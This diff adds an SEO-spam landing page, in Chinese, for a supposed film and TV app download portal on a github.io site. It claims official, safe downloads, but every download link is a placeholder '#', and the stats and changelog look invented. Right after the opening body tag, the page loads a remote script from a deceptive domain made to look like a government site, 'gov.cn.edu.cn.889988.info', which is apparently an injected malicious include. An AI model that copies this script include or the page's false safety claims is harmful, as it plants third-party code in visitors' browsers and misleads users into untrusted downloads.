@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视app - 影视app下载与在线观看入口精选 | yingshiapp-cn.github.io</title>
+<meta name="keywords" content="影视app,影视app下载,影视app官网,影视app在线观看,影视app大全,影视app推荐,影视app客户端,影视app安卓版,影视app苹果版,影视app官方下载,yingshiapp-cn.github.io">
+<meta name="description" content="影视app（yingshiapp-cn.github.io）精选影视app下载入口与在线观看站点，汇聚电影、电视剧、综艺、动漫等高清影视app客户端，官方正版、安全下载，影视app一站搞定。">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:title" content="影视app - 影视app下载与在线观看入口精选">
+<meta property="og:description" content="yingshiapp-cn.github.io 精选影视app下载入口与在线观看站点，官方正版、安全下载。">
+<meta property="og:type" content="website">
+<meta property="og:image" content="https://picsum.photos/seed/yingshiapp-cover/1200/630">
+<link rel="canonical" href="https://yingshiapp-cn.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#181b22; --ink2:#6b7280; --ink3:#9aa1ac; --line:#e8ecf2;
+  --bg:#f4f6fa; --white:#fff;
+  --blue:#1a6bff; --blue2:#4d94ff; --cyan:#00d4d4; --cyan2:#5effff;
+  --navy:#0a1628; --navy2:#14233d; --lime:#c6ff3d; --lime2:#e2ff8a;
+  --sh:0 14px 38px rgba(10,22,40,.12);
+  --rd:22px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.72;font-size:16px}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block;border-radius:0}
+.container{max-width:1160px;margin:0 auto;padding:0 22px}
+
+/* ===== 顶栏 ===== */
+.head{position:sticky;top:0;z-index:99;background:rgba(255,255,255,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.head .in{display:flex;align-items:center;justify-content:space-between;height:70px}
+.brand{display:flex;align-items:center;gap:12px}
+.logo{width:40px;height:40px;border-radius:13px;background:linear-gradient(150deg,var(--blue),var(--cyan));display:grid;place-items:center;color:#fff;font-size:18px;font-weight:900;box-shadow:0 8px 18px rgba(26,107,255,.32)}
+.brand b{font-size:19px;letter-spacing:.5px}
+.brand b small{display:block;font-size:9.5px;font-weight:700;color:var(--ink3);letter-spacing:1.6px;text-transform:uppercase}
+.menu{display:flex;align-items:center;gap:4px}
+.menu a{padding:9px 15px;border-radius:11px;font-size:14.5px;font-weight:600;color:var(--ink2);transition:.22s}
+.menu a:hover{color:var(--blue);background:#eef4ff}
+.menu a.cta{color:#fff;background:linear-gradient(140deg,var(--blue),var(--cyan));box-shadow:0 7px 17px rgba(26,107,255,.3);margin-left:6px}
+.menu a.cta:hover{transform:translateY(-2px);color:#fff}
+.burger{display:none;width:44px;height:44px;border:1px solid var(--line);border-radius:12px;background:#fff;cursor:pointer;flex-direction:column;align-items:center;justify-content:center;gap:5px}
+.burger i{width:19px;height:2px;background:var(--ink);border-radius:2px;transition:.25s}
+.burger.on i:nth-child(1){transform:translateY(7px) rotate(45deg)}.burger.on i:nth-child(2){opacity:0}.burger.on i:nth-child(3){transform:translateY(-7px) rotate(-45deg)}
+
+/* ===== Hero（左右分栏 + 设备框） ===== */
+.hero{padding:72px 0 58px;position:relative;overflow:hidden;background:radial-gradient(1200px 500px at 82% -10%,rgba(0,212,212,.16),transparent),radial-gradient(900px 500px at 8% 110%,rgba(26,107,255,.14),transparent)}
+.hero .in{display:grid;grid-template-columns:1.1fr .9fr;gap:56px;align-items:center}
+.hero .txt .tag{display:inline-flex;align-items:center;gap:8px;font-size:12px;font-weight:800;letter-spacing:1.4px;color:var(--blue);background:#e8f0ff;padding:8px 17px;border-radius:999px}
+.hero .txt .tag .dot{width:7px;height:7px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 4px rgba(0,212,212,.25)}
+.hero .txt h1{font-size:clamp(32px,5vw,49px);line-height:1.2;font-weight:900;margin:20px 0 14px;letter-spacing:-.7px}
+.hero .txt h1 em{font-style:normal;background:linear-gradient(140deg,var(--blue),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .txt p{font-size:clamp(15px,1.8vw,17px);color:var(--ink2)}
+.hero .acts{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap}
+.hero .acts a{font-weight:800;font-size:14.5px;padding:13px 27px;border-radius:13px;transition:.24s;display:inline-flex;align-items:center;gap:7px}
+.hero .acts a.pri{background:linear-gradient(140deg,var(--blue),var(--cyan));color:#fff;box-shadow:0 9px 22px rgba(26,107,255,.32)}
+.hero .acts a.pri:hover{transform:translateY(-3px)}
+.hero .acts a.sec{background:#fff;color:var(--blue);border:1.5px solid var(--blue);box-shadow:var(--sh)}
+.hero .acts a.sec:hover{background:#eef4ff}
+.hero .stats{display:flex;gap:34px;margin-top:34px;flex-wrap:wrap}
+.hero .stats div span{display:block;font-size:26px;font-weight:900;color:var(--navy)}
+.hero .stats div small{font-size:12.5px;color:var(--ink2);font-weight:700}
+
+.device{position:relative;background:linear-gradient(165deg,var(--navy),#1c3158);border-radius:38px;padding:26px 24px;box-shadow:0 30px 66px rgba(10,22,40,.32)}
+.device::before{content:"";position:absolute;inset:-2px;border-radius:40px;background:linear-gradient(140deg,var(--blue),var(--cyan),var(--lime));z-index:-1;opacity:.75}
+.device .notch{width:104px;height:22px;background:#000;border-radius:999px;margin:0 auto 18px;position:relative}
+.device .notch::after{content:"";position:absolute;right:-26px;top:6px;width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,.25)}
+.device .screen{border-radius:20px;overflow:hidden;background:#0a1628}
+.device .screen img{width:100%;height:auto;display:block;border-radius:0}
+.device .dcap{display:flex;align-items:center;justify-content:space-between;margin-top:16px;color:#c3cee0;font-size:12px;font-weight:700}
+.device .dcap b{color:#fff;font-size:13px}
+.device .dcap .ver{background:rgba(198,255,61,.18);color:var(--lime2);padding:4px 10px;border-radius:7px;font-size:11px;font-weight:800}
+
+/* ===== 区块头 ===== */
+section{padding:64px 0;position:relative}
+.stitle{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:34px;flex-wrap:wrap}
+.stitle .l .no{font-size:12px;font-weight:800;letter-spacing:2px;color:var(--blue);text-transform:uppercase}
+.stitle .l h2{font-size:clamp(23px,3.3vw,29px);font-weight:900;letter-spacing:-.4px;margin-top:5px}
+.stitle .l h2 i{font-style:normal;background:linear-gradient(140deg,var(--blue),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stitle .l p{font-size:14.5px;color:var(--ink2);margin-top:7px;max-width:470px}
+.stitle .r{font-size:14px;font-weight:700;color:var(--blue);white-space:nowrap}
+.stitle .r:hover{text-decoration:underline}
+
+/* ===== 栏目一：下载中心（卡片矩阵） ===== */
+.apps{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.app{background:#fff;border-radius:20px;overflow:hidden;box-shadow:var(--sh);transition:.28s;border:1px solid rgba(232,236,242,.9)}
+.app:hover{transform:translateY(-8px);box-shadow:0 24px 48px rgba(10,22,40,.14)}
+.app .shot{position:relative;height:168px;overflow:hidden}
+.app .shot img{width:100%;height:100%;object-fit:cover;transition:.5s}
+.app:hover .shot img{transform:scale(1.07)}
+.app .shot .os{position:absolute;top:12px;left:12px;font-size:11px;font-weight:800;color:#fff;background:rgba(10,22,40,.62);backdrop-filter:blur(6px);padding:5px 11px;border-radius:8px}
+.app .shot .sz{position:absolute;top:12px;right:12px;font-size:11px;font-weight:800;color:#084c3e;background:var(--lime2);padding:5px 11px;border-radius:8px}
+.app .info{padding:18px}
+.app .info .row{display:flex;align-items:center;gap:11px;margin-bottom:11px}
+.app .info .ic{width:40px;height:40px;border-radius:12px;flex:none;display:grid;place-items:center;font-size:18px;color:#fff}
+.app .info .nm b{font-size:15.5px;font-weight:800;display:block;line-height:1.3}
+.app .info .nm small{font-size:11px;color:var(--ink3);font-family:ui-monospace,Menlo,Consolas,monospace}
+.app .info p{font-size:12.5px;color:var(--ink2);line-height:1.7;margin-bottom:14px}
+.app .info .foot{display:flex;justify-content:space-between;align-items:center;padding-top:12px;border-top:1px solid var(--line);font-size:11.5px;color:var(--ink2)}
+.app .info .foot a{color:var(--blue);font-weight:800;background:#e8f0ff;padding:6px 13px;border-radius:9px}
+
+/* ===== 栏目二：版本更新（左右交替时间线） ===== */
+.timeline{position:relative;padding-left:0}
+.tl-item{display:grid;grid-template-columns:120px 1fr;gap:26px;margin-bottom:20px;background:#fff;border-radius:18px;padding:22px;box-shadow:var(--sh);transition:.24s;align-items:center}
+.tl-item:hover{transform:translateX(6px)}
+.tl-item .v{text-align:center;font-weight:900;font-size:16px;color:#fff;border-radius:13px;padding:13px 8px;line-height:1.4;box-shadow:0 8px 17px rgba(26,107,255,.28)}
+.tl-item .v small{display:block;font-size:10.5px;opacity:.85;font-weight:700;letter-spacing:1px}
+.tl-item .body b{font-size:15.5px;font-weight:800;display:block}
+.tl-item .body p{font-size:13.5px;color:var(--ink2);margin:6px 0 9px}
+.tl-item .body .tags{display:flex;gap:7px;flex-wrap:wrap}
+.tl-item .body .tags span{font-size:11px;font-weight:700;color:var(--blue);background:#e8f0ff;padding:4px 10px;border-radius:6px}
+
+/* ===== 栏目三：使用教程（步骤编号块） ===== */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.step{background:#fff;border-radius:20px;padding:26px 22px;box-shadow:var(--sh);transition:.26s;position:relative;overflow:hidden}
+.step::after{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(140deg,var(--blue),var(--cyan))}
+.step:hover{transform:translateY(-7px)}
+.step .n{width:46px;height:46px;border-radius:14px;display:grid;place-items:center;font-size:20px;font-weight:900;color:#fff;background:linear-gradient(140deg,var(--blue),var(--cyan));box-shadow:0 8px 17px rgba(26,107,255,.28);margin-bottom:15px}
+.step b{font-size:15.5px;font-weight:800;display:block}
+.step p{font-size:13px;color:var(--ink2);margin-top:7px;line-height:1.7}
+.step a{display:inline-block;margin-top:13px;font-size:12.5px;font-weight:800;color:var(--blue)}
+
+/* ===== 栏目四：站点目录（紧凑表格） ===== */
+.tablewrap{background:#fff;border-radius:20px;box-shadow:var(--sh);overflow:hidden}
+table{width:100%;border-collapse:collapse}
+thead th{background:linear-gradient(140deg,var(--navy),#1c3158);color:#fff;font-size:13px;font-weight:800;text-align:left;padding:15px 18px;letter-spacing:.4px;white-space:nowrap}
+tbody td{padding:15px 18px;font-size:13.5px;border-bottom:1px solid var(--line);vertical-align:middle}
+tbody tr{transition:.18s}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover{background:#f2f7ff}
+tbody .nm{display:flex;align-items:center;gap:11px}
+tbody .nm .ic{width:34px;height:34px;border-radius:10px;flex:none;display:grid;place-items:center;font-size:15px;color:#fff}
+tbody .nm b{font-size:14px;font-weight:800;display:block;line-height:1.3}
+tbody .nm small{font-size:10.5px;color:var(--ink3);font-family:ui-monospace,Menlo,Consolas,monospace}
+tbody .url{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;color:var(--ink2);word-break:break-all}
+tbody .st{font-size:12px;font-weight:800;color:#0a8a4a}
+tbody .st.off{color:#a16207}
+tbody a.go{font-size:12px;font-weight:800;color:var(--blue);background:#e8f0ff;padding:6px 13px;border-radius:9px;white-space:nowrap}
+
+/* ===== 栏目五：FAQ（手风琴） ===== */
+.faqbox{background:linear-gradient(160deg,#eef4ff,#e6fbfb);border-radius:28px;padding:14px}
+.faq{max-width:820px;margin:0 auto}
+.faq details{background:#fff;border-radius:16px;margin-bottom:12px;box-shadow:0 6px 18px rgba(10,22,40,.07);overflow:hidden;transition:.24s}
+.faq details[open]{box-shadow:0 12px 30px rgba(10,22,40,.12)}
+.faq summary{cursor:pointer;padding:20px 24px;font-size:15.5px;font-weight:800;display:flex;align-items:center;justify-content:space-between;gap:16px;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";flex:none;width:28px;height:28px;border-radius:9px;background:linear-gradient(140deg,var(--blue),var(--cyan));color:#fff;display:grid;place-items:center;font-size:15px;font-weight:900;transition:.28s}
+.faq details[open] summary::after{transform:rotate(45deg)}
+.faq summary b{display:flex;align-items:center;gap:12px}
+.faq summary b .no{width:26px;height:26px;border-radius:8px;background:#e8f0ff;color:var(--blue);font-size:12px;font-weight:900;display:grid;place-items:center;flex:none}
+.faq details p{padding:0 24px 20px 62px;font-size:14px;color:var(--ink2);line-height:1.8}
+
+/* ===== 页脚 ===== */
+footer{background:var(--navy);color:#9aa1ac;padding:60px 0 28px}
+.fgrid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:36px;margin-bottom:40px}
+.fbrand .brand b{color:#fff}.fbrand .brand b small{color:#6b7280}
+.fbrand p{font-size:13.5px;line-height:1.95;margin-top:14px;max-width:330px;color:#9aa1ac}
+.fcol h4{color:#fff;font-size:15px;font-weight:800;margin-bottom:16px}
+.fcol a{display:block;font-size:14px;padding:5px 0;color:#9aa1ac;transition:.18s}
+.fcol a:hover{color:var(--cyan2);transform:translateX(3px)}
+.fbot{border-top:1px solid rgba(255,255,255,.08);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:13px}
+.fbot a{color:#9aa1ac}.fbot a:hover{color:#fff}
+
+#top{position:fixed;right:20px;bottom:-64px;width:46px;height:46px;border-radius:15px;background:linear-gradient(140deg,var(--blue),var(--cyan));color:#fff;border:none;cursor:pointer;z-index:80;box-shadow:0 10px 24px rgba(26,107,255,.4);font-size:17px;transition:.32s}
+#top.on{bottom:22px}
+
+@media(max-width:1000px){
+  .hero .in{grid-template-columns:1fr;gap:44px}
+  .device{max-width:420px;margin:0 auto}
+  .apps{grid-template-columns:repeat(2,1fr)}
+  .steps{grid-template-columns:repeat(2,1fr)}
+  .tl-item{grid-template-columns:96px 1fr;gap:18px}
+}
+@media(max-width:960px){
+  .menu{position:fixed;top:70px;left:0;right:0;flex-direction:column;align-items:stretch;background:#fff;padding:14px;border-bottom:1px solid var(--line);box-shadow:0 16px 32px rgba(10,22,40,.1);transform:translateY(-150%);opacity:0;pointer-events:none;transition:.3s}
+  .menu.on{transform:translateY(0);opacity:1;pointer-events:auto}
+  .menu a{text-align:center;padding:12px}
+  .menu a.cta{margin:6px 0 0}
+  .burger{display:flex}
+  .hero{padding:50px 0 42px}
+}
+@media(max-width:640px){
+  section{padding:46px 0}
+  .container{padding:0 16px}
+  .stitle{margin-bottom:24px}
+  .apps{grid-template-columns:1fr}
+  .steps{grid-template-columns:1fr}
+  .tl-item{grid-template-columns:1fr;gap:12px;text-align:left}
+  .tl-item .v{padding:10px}
+  .tablewrap{background:transparent;box-shadow:none;border-radius:0;overflow:visible}
+  table,thead,tbody,tr,td{display:block;width:100%}
+  thead{display:none}
+  tbody tr{background:#fff;border-radius:16px;padding:16px;margin-bottom:14px;box-shadow:var(--sh);display:block}
+  tbody td{border:none;padding:6px 0;font-size:14px}
+  tbody td.url::before{content:"网址：";color:var(--ink3);font-size:11px}
+  tbody td.st::before{content:"状态：";color:var(--ink3);font-size:11px}
+  tbody td.go{text-align:left;padding-top:12px}
+  .fgrid{grid-template-columns:1fr;gap:26px}
+  .fbot{flex-direction:column}
+  .faq summary{padding:17px 18px;font-size:15px}
+  .faq details p{padding:0 18px 17px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="head">
+  <div class="container in">
+    <a class="brand" href="#top"><span class="logo">影视</span><b>影视app<small>YINGSHIAPP · yingshiapp-cn.github.io</small></b></a>
+    <nav class="menu" id="menu">
+      <a href="#apps">下载中心</a>
+      <a href="#ver">版本更新</a>
+      <a href="#how">使用教程</a>
+      <a href="#dir">站点目录</a>
+      <a href="#faq">常见问题</a>
+      <a href="#" class="cta">立即下载</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- ===== Hero（设备展示式） ===== -->
+<section class="hero" id="top">
+  <div class="container in">
+    <div class="txt">
+      <span class="tag"><span class="dot"></span>官方正版 · 安全下载</span>
+      <h1>影视app · 影视app下载<br>与在线观看<em>一站搞定</em></h1>
+      <p>yingshiapp-cn.github.io 精选影视app官方下载入口与在线观看站点，涵盖安卓、苹果、TV 多端客户端，汇聚电影、电视剧、综艺、动漫等高清资源。</p>
+      <div class="acts">
+        <a href="#apps" class="pri">⬇ 下载影视app</a>
+        <a href="#dir" class="sec">浏览站点目录</a>
+      </div>
+      <div class="stats">
+        <div><span>200+</span><small>影视app 收录</small></div>
+        <div><span>6.8万</span><small>累计下载</small></div>
+        <div><span>3.2</span><small>评分 / 5</small></div>
+        <div><span>3</span><small>平台覆盖</small></div>
+      </div>
+    </div>
+
+    <div class="device">
+      <div class="notch"></div>
+      <div class="screen">
+        <img src="https://picsum.photos/seed/yingshiapp-app/520/980" alt="影视app 客户端界面预览" loading="lazy">
+      </div>
+      <div class="dcap"><b>影视app 客户端</b><span>Version 4.2.1</span><span class="ver">NEW</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：下载中心（卡片矩阵） ===== -->
+<section id="apps" style="padding-top:0">
+  <div class="container">
+    <div class="stitle">
+      <div class="l"><div class="no">DOWNLOAD · 01</div><h2><i>下载中心</i> · 影视app 官方下载</h2>
+      <p>以截图卡片矩阵呈现各影视app 客户端，含系统平台、版本大小与下载入口。</p></div>
+      <a href="#" class="r">查看全部影视app →</a>
+    </div>
+
+    <div class="apps">
+      <article class="app"><div class="shot"><img src="https://picsum.photos/seed/yingshiapp-a1/520/420" alt="影视app 安卓版界面" loading="lazy"><span class="os">Android</span><span class="sz">38.6 MB</span></div><div class="info"><div class="row"><span class="ic" style="background:linear-gradient(140deg,#1a6bff,#4d94ff)">▶</span><span class="nm"><b>影视app 安卓版</b><small>yingshiapp-cn.github.io/android</small></span></div><p>影视app 安卓官方客户端，支持离线缓存、投屏播放与画质自选，适配主流安卓机型。</p><div class="foot"><span>v4.2.1 · 官方正版</span><a href="#">下载 →</a></div></div></article>
+      <article class="app"><div class="shot"><img src="https://picsum.photos/seed/yingshiapp-a2/520/420" alt="影视app iOS版界面" loading="lazy"><span class="os">iOS</span><span class="sz">52.1 MB</span></div><div class="info"><div class="row"><span class="ic" style="background:linear-gradient(140deg,#0a1628,#1c3158)">🍎</span><span class="nm"><b>影视app 苹果版</b><small>yingshiapp-cn.github.io/ios</small></span></div><p>影视app 苹果官方版本，已通过 App Store 审核，支持 iPhone 与 iPad 横竖屏播放。</p><div class="foot"><span>v4.2.0 · 官方正版</span><a href="#">下载 →</a></div></div></article>
+      <article class="app"><div class="shot"><img src="https://picsum.photos/seed/yingshiapp-a3/520/420" alt="影视app 电视版界面" loading="lazy"><span class="os">Android TV</span><span class="sz">27.4 MB</span></div><div class="info"><div class="row"><span class="ic" style="background:linear-gradient(140deg,#00d4d4,#5effff);color:#084c3e">📺</span><span class="nm"><b>影视app 电视版</b><small>yingshiapp-cn.github.io/tv</small></span></div><p>影视app 大屏客户端，适配电视盒子与智能电视，支持遥控器操作与 4K 输出。</p><div class="foot"><span>v3.9.5 · 官方正版</span><a href="#">下载 →</a></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：版本更新（左右交替时间线） ===== -->
+<section id="ver" style="background:#fff">
+  <div class="container">
+    <div class="stitle">
+      <div class="l"><div class="no">CHANGELOG · 02</div><h2><i>版本更新</i> · 影视app 更新日志</h2>
+      <p>以时间线形式展示影视app 各版本更新内容，了解最新功能与修复项。</p></div>
+      <a href="#" class="r">历史版本 →</a>
+    </div>
+
+    <div class="timeline">
+      <div class="tl-item"><div class="v" style="background:linear-gradient(140deg,#1a6bff,#00d4d4)">v4.2.1<small>2026.09</small></div><div class="body"><b>影视app 4.2.1 稳定版</b><p>优化播放器内核，修复部分机型闪退问题，提升加载速度与投屏稳定性。</p><div class="tags"><span>性能优化</span><span>闪退修复</span><span>投屏增强</span></div></div></div>
+      <div class="tl-item"><div class="v" style="background:linear-gradient(140deg,#0a1628,#1c3158)">v4.2.0<small>2026.08</small></div><div class="body"><b>影视app 4.2.0 功能版</b><p>新增离线缓存与画质自选功能，支持 1080P/4K 切换，优化搜索准确度。</p><div class="tags"><span>离线缓存</span><span>画质切换</span><span>搜索优化</span></div></div></div>
+      <div class="tl-item"><div class="v" style="background:linear-gradient(140deg,#c6ff3d,#5effff);color:#084c3e">v4.1.5<small>2026.07</small></div><div class="body"><b>影视app 4.1.5 体验版</b><p>重做个人中心页面，新增播放记录云同步与倍速播放记忆。</p><div class="tags"><span>界面重做</span><span>云同步</span><span>倍速记忆</span></div></div></div>
+      <div class="tl-item"><div class="v" style="background:linear-gradient(140deg,#7b5cf0,#a78bfa)">v4.1.0<small>2026.06</small></div><div class="body"><b>影视app 4.1.0 大屏版</b><p>上线影视app 电视版，适配电视盒子与智能电视，支持遥控器与 4K 输出。</p><div class="tags"><span>电视版</span><span>遥控器适配</span><span>4K 输出</span></div></div></div>
+      <div class="tl-item"><div class="v" style="background:linear-gradient(140deg,#19c2a0,#5fe0c5);color:#084c3e">v4.0.8<small>2026.05</small></div><div class="body"><b>影视app 4.0.8 基础版</b><p>首次开放影视app 官方下载入口，涵盖安卓、苹果双平台。</p><div class="tags"><span>安卓</span><span>iOS</span><span>首发</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：使用教程（步骤编号块） ===== -->
+<section id="how" style="padding-top:0">
+  <div class="container">
+    <div class="stitle">
+      <div class="l"><div class="no">GUIDE · 03</div><h2><i>使用教程</i> · 影视app 安装四步</h2>
+      <p>以编号步骤块展示影视app 的完整安装与使用流程。</p></div>
+    </div>
+
+    <div class="steps">
+      <div class="step"><div class="n">1</div><b>选择平台</b><p>在影视app 下载中心选择对应系统：安卓、苹果或电视版。</p><a href="#apps">前往下载中心 →</a></div>
+      <div class="step"><div class="n">2</div><b>下载安装</b><p>点击下载按钮获取影视app 安装包，按提示完成安装授权。</p><a href="#">查看安装说明 →</a></div>
+      <div class="step"><div class="n">3</div><b>打开客户端</b><p>启动影视app，允许必要权限，进入首页浏览电影、电视剧等内容。</p><a href="#">功能介绍 →</a></div>
+      <div class="step"><div class="n">4</div><b>开始观看</b><p>选择影片后在线播放，支持投屏、缓存与画质切换。</p><a href="#dir">浏览站点目录 →</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：站点目录（紧凑表格） ===== -->
+<section id="dir" style="background:#fff">
+  <div class="container">
+    <div class="stitle">
+      <div class="l"><div class="no">DIRECTORY · 04</div><h2><i>站点目录</i> · 影视app 收录网址一览</h2>
+      <p>以表格形式列出全部收录的影视app 站点，含网址、平台、版本与访问状态。</p></div>
+      <a href="#" class="r">申请收录 →</a>
+    </div>
+
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>站点名称</th><th>网址</th><th>平台</th><th>版本</th><th>状态</th><th>操作</th></tr></thead>
+        <tbody>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#1a6bff,#00d4d4)">影视</span><span><b>影视app 主站</b><small>yingshiapp-cn.github.io</small></span></div></td><td class="url">yingshiapp-cn.github.io</td><td>全平台</td><td>v4.2.1</td><td class="st">● 正常访问</td><td><a href="#" class="go">直达 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#0a1628,#1c3158)">▶</span><span><b>影视app 安卓版</b><small>yingshiapp-cn.github.io/android</small></span></div></td><td class="url">yingshiapp-cn.github.io/android</td><td>Android</td><td>v4.2.1</td><td class="st">● 正常访问</td><td><a href="#" class="go">下载 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#7b5cf0,#a78bfa)">🍎</span><span><b>影视app 苹果版</b><small>yingshiapp-cn.github.io/ios</small></span></div></td><td class="url">yingshiapp-cn.github.io/ios</td><td>iOS</td><td>v4.2.0</td><td class="st">● 正常访问</td><td><a href="#" class="go">下载 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#00d4d4,#5effff);color:#084c3e">📺</span><span><b>影视app 电视版</b><small>yingshiapp-cn.github.io/tv</small></span></div></td><td class="url">yingshiapp-cn.github.io/tv</td><td>TV</td><td>v3.9.5</td><td class="st">● 正常访问</td><td><a href="#" class="go">下载 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#19c2a0,#5fe0c5);color:#084c3e">🎬</span><span><b>影视app 电影站</b><small>film.yingshiapp-cn.github.io</small></span></div></td><td class="url">film.yingshiapp-cn.github.io</td><td>Web</td><td>在线</td><td class="st">● 正常访问</td><td><a href="#" class="go">直达 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#ff8a3d,#ffb454)">📺</span><span><b>影视app 剧集站</b><small>drama.yingshiapp-cn.github.io</small></span></div></td><td class="url">drama.yingshiapp-cn.github.io</td><td>Web</td><td>在线</td><td class="st off">● 维护中</td><td><a href="#" class="go">直达 →</a></td></tr>
+          <tr><td><div class="nm"><span class="ic" style="background:linear-gradient(140deg,#c6ff3d,#5effff);color:#084c3e">🌸</span><span><b>影视app 动漫站</b><small>ani.yingshiapp-cn.github.io</small></span></div></td><td class="url">ani.yingshiapp-cn.github.io</td><td>Web</td><td>在线</td><td class="st">● 正常访问</td><td><a href="#" class="go">直达 →</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：FAQ（手风琴） ===== -->
+<section id="faq" style="padding-top:0">
+  <div class="container">
+    <div class="stitle">
+      <div class="l"><div class="no">FAQ · 05</div><h2><i>常见问题</i> · 关于影视app 的疑问</h2>
+      <p>以折叠面板展示影视app 使用中的常见问题与解答，点击展开查看详情。</p></div>
+    </div>
+
+    <div class="faqbox">
+      <div class="faq">
+        <details open><summary><b><span class="no">Q1</span>影视app 是什么？</b></summary><p>影视app（yingshiapp-cn.github.io）是一个影视app 下载与在线观看导航站，精选电影、电视剧、综艺、动漫等高清影视app 客户端入口，官方正版、安全下载，影视app 一站搞定。</p></details>
+        <details><summary><b><span class="no">Q2</span>影视app 支持哪些平台？</b></summary><p>影视app 提供安卓版、苹果版与电视版三种客户端，分别适配手机、平板与大屏设备，满足不同场景的观看需求。</p></details>
+        <details><summary><b><span class="no">Q3</span>影视app 下载安全吗？</b></summary><p>所有影视app 下载链接均来自官方渠道，安装包经过安全检测，建议从 yingshiapp-cn.github.io 官方站点获取，避免第三方来源。</p></details>
+        <details><summary><b><span class="no">Q4</span>影视app 收费吗？</b></summary><p>影视app 基础观看功能免费，部分高清资源与离线缓存功能可能涉及增值服务，具体以客户端内说明为准。</p></details>
+        <details><summary><b><span class="no">Q5</span>如何反馈影视app 问题？</b></summary><p>可通过 yingshiapp-cn.github.io 的联系入口提交问题，描述具体现象与机型信息，影视app 团队会在 3 个工作日内回复处理。</p></details>
+        <details><summary><b><span class="no">Q6</span>影视app 会持续更新吗？</b></summary><p>会。影视app 保持每月更新节奏，持续优化播放体验、修复已知问题并增加新功能，更新日志可在版本更新栏目查看。</p></details>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="fbrand"><div class="brand"><span class="logo">影视</span><b>影视app<small>YINGSHIAPP · yingshiapp-cn.github.io</small></b></div><p>影视app（yingshiapp-cn.github.io）——影视app 下载与在线观看入口精选，官方正版、安全下载，影视app 一站搞定。</p></div>
+      <div class="fcol"><h4>影视app 频道</h4><a href="#apps">下载中心</a><a href="#ver">版本更新</a><a href="#how">使用教程</a><a href="#dir">站点目录</a><a href="#faq">常见问题</a></div>
+      <div class="fcol"><h4>平台入口</h4><a href="#">安卓版</a><a href="#">苹果版</a><a href="#">电视版</a><a href="#">网页版</a><a href="#">极速版</a></div>
+      <div class="fcol"><h4>关于影视app</h4><a href="#">关于我们</a><a href="#">收录标准</a><a href="#">免责声明</a><a href="#">联系我们</a><a href="#">隐私政策</a></div>
+    </div>
+    <div class="fbot">
+      <span>© 2026 影视app · yingshiapp-cn.github.io · 网站名称：影视app　网站网址：https://yingshiapp-cn.github.io</span>
+      <span><a href="#">免责声明</a> · <a href="#">网站地图</a> · <a href="#top">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<button id="top" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.addEventListener('click',function(){b.classList.toggle('on');m.classList.toggle('on')});
+  m.addEventListener('click',function(e){if(e.target.tagName==='A'){b.classList.remove('on');m.classList.remove('on')}});
+  var t=document.getElementById('top');
+  window.addEventListener('scroll',function(){t.classList.toggle('on',window.scrollY>420)});
+  t.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+})();
+</script>
+</body>
+</html>
